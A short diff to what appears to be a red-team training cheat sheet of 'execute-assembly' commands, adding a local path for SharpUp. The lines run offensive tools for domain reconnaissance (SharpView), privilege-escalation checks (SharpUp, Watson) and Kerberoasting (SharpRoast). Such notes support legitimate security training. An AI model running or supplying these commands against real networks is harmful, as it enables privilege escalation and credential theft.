@@ -4,6 +4,7 @@ execute-assembly C:/Users/Public/SharpView.exe Get-DomainController Get-ObjectAc
 execute-assembly C:/Users/Public/SharpView.exe Get-DomainController Get-DomainSubnet
 
 execute-assembly C:/Users/Public/SharpUp.exe
+execute-assembly /root/Desktop/RTO-Data/Data/SharpUp.exe
 execute-assembly C:/Users/Public/watson.exe
 
 execute-assembly C:/Users/Public/SharpRoast.exe all
